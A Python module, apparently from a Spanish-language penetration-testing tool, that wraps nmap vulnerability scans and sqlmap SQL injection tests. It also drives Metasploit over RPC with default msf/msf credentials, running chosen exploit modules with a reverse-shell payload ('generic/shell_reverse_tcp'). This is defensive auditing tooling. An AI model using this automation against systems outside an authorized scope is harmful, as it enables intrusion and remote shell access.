import subprocess
import shutil
import logging
from dataclasses import dataclass, field
from rich.panel import Panel
from rich.console import Console

console = Console()
logger = logging.getLogger(__name__)


@dataclass
class AuditResult:
    fase: str
    target: str
    stdout: str = ""
    stderr: str = ""
    returncode: int = -1
    error: str = ""

    @property
    def exitoso(self) -> bool:
        return self.returncode == 0 and not self.error


class AuditEngine:
    TIMEOUT_NMAP = 300   # segundos
    TIMEOUT_SQLMAP = 600
    TIMEOUT_DEFAULT = 60

    def __init__(self, main_app):
        self.main_app = main_app
        self._verificar_dependencias()

    # ------------------------------------------------------------------ #
    #  Verificación de herramientas al inicio                              #
    # ------------------------------------------------------------------ #

    HERRAMIENTAS_REQUERIDAS = ["nmap", "sqlmap"]

    def _verificar_dependencias(self):
        faltantes = [h for h in self.HERRAMIENTAS_REQUERIDAS
                     if shutil.which(h) is None]
        if faltantes:
            console.print(
                f"[bold red][!] Herramientas no encontradas en PATH: "
                f"{', '.join(faltantes)}[/bold red]"
            )
            logger.warning("Dependencias faltantes: %s", faltantes)

    # ------------------------------------------------------------------ #
    #  Utilidad interna para ejecutar subprocesos                          #
    # ------------------------------------------------------------------ #

    def _ejecutar(self, cmd: list[str], timeout: int, fase: str, target: str) -> AuditResult:
        resultado = AuditResult(fase=fase, target=target)
        logger.info("[%s] Comando: %s", fase, " ".join(cmd))

        try:
            proc = subprocess.run(
                cmd,
                capture_output=True,
                text=True,
                timeout=timeout,
            )
            resultado.stdout = proc.stdout
            resultado.stderr = proc.stderr
            resultado.returncode = proc.returncode

            if proc.returncode != 0:
                logger.warning("[%s] Salida con código %d: %s",
                               fase, proc.returncode, proc.stderr[:200])

        except subprocess.TimeoutExpired:
            resultado.error = f"Timeout ({timeout}s) alcanzado."
            logger.error("[%s] Timeout en: %s", fase, target)

        except FileNotFoundError:
            resultado.error = f"Herramienta no encontrada: {cmd[0]}"
            logger.error("[%s] %s no está instalado.", fase, cmd[0])

        except Exception as e:
            resultado.error = str(e)
            logger.exception("[%s] Error inesperado.", fase)

        return resultado

    # ------------------------------------------------------------------ #
    #  FASE 3: Detección de vulnerabilidades (Nmap NSE)                   #
    # ------------------------------------------------------------------ #

    def escaneo_vulnerabilidades(self, target: str,
                                 scripts: str = "vuln",
                                 puertos: str | None = None) -> AuditResult:
        self.main_app.animar_barra(
            f"[Fase 3] Buscando vulnerabilidades en {target}...")

        cmd = ["nmap", "-sV", "--script", scripts, target]
        if puertos:
            cmd += ["-p", puertos]

        return self._ejecutar(cmd, self.TIMEOUT_NMAP, "Nmap-NSE", target)

    # ------------------------------------------------------------------ #
    #  FASE 4: Auditoría SQL (SQLmap)                                      #
    # ------------------------------------------------------------------ #

    def auditoria_sql(self, url: str,
                      nivel: int = 1,
                      riesgo: int = 1,
                      extra_args: list[str] | None = None) -> AuditResult:
        self.main_app.animar_barra(
            f"[Fase 4] Analizando inyección SQL en {url}...")

        cmd = [
            "sqlmap", "-u", url,
            "--batch",          # sin confirmaciones interactivas
            "--banner",         # obtener banner del DBMS
            f"--level={nivel}",
            f"--risk={riesgo}",
        ]
        if extra_args:
            cmd.extend(extra_args)

        return self._ejecutar(cmd, self.TIMEOUT_SQLMAP, "SQLmap", url)

    # ------------------------------------------------------------------ #
    #  FASE 5: Control de exploits (Metasploit RPC)                        #
    # ------------------------------------------------------------------ #

    def conectar_metasploit(self,
                            host: str = "127.0.0.1",
                            port: int = 55553,
                            user: str = "msf",
                            password: str = "msf") -> bool:
        console.print(
            "[bold yellow][*] Conectando con Metasploit RPC Daemon...[/bold yellow]")

        try:
            from pymetasploit3.msfrpc import MsfRpcClient   # importación diferida
            self.msf_client = MsfRpcClient(
                password, server=host, port=port, username=user, ssl=True
            )
            version = self.msf_client.core.version
            console.print(
                Panel(
                    f"[green]Metasploit conectado[/green]\n"
                    f"Versión: {version['version']}  |  "
                    f"API: {version['api_version']}",
                    title="[bold green]MSF RPC[/bold green]"
                )
            )
            logger.info("Metasploit RPC conectado: %s", version)
            return True

        except ImportError:
            console.print(
                "[red][!] pymetasploit3 no instalado. "
                "Ejecuta: pip install pymetasploit3[/red]"
            )
        except Exception as e:
            console.print(
                f"[bold red][!] Error al conectar con MSF RPC: {e}[/bold red]")
            logger.error("MSF RPC error: %s", e)

        return False

    def ejecutar_modulo_msf(self, modulo: str, opciones: dict) -> dict | None:
        if not hasattr(self, "msf_client"):
            console.print(
                "[red][!] Primero debes conectar con Metasploit (conectar_metasploit).[/red]")
            return None

        try:
            exploit = self.msf_client.modules.use("exploit", modulo)
            for k, v in opciones.items():
                exploit[k] = v
            resultado = exploit.execute(payload="generic/shell_reverse_tcp")
            logger.info("Módulo MSF ejecutado: %s → %s", modulo, resultado)
            return resultado
        except Exception as e:
            logger.error("Error ejecutando módulo MSF %s: %s", modulo, e)
            console.print(f"[red][!] Error en módulo MSF: {e}[/red]")
            return None
